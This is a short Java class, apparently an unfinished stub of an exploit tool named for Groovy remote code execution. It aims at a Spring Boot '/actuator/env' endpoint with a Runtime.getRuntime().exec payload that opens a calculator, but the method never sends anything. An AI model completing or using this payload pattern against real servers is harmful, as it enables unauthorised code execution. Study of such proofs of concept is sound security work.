package src.main.module;

public class MainSourceGrooyRCE {
    public String address;
    public String command;
    public MainSourceGrooyRCE(String address,String command){
        this.address = address;
        this.command = command;
    }

    public void Exp(){
        String api = "/actuator/env";
        String data = "Runtime.getRuntime().exec(\"open -a Calculator\");";
        if(command == null){

        }
    }
}
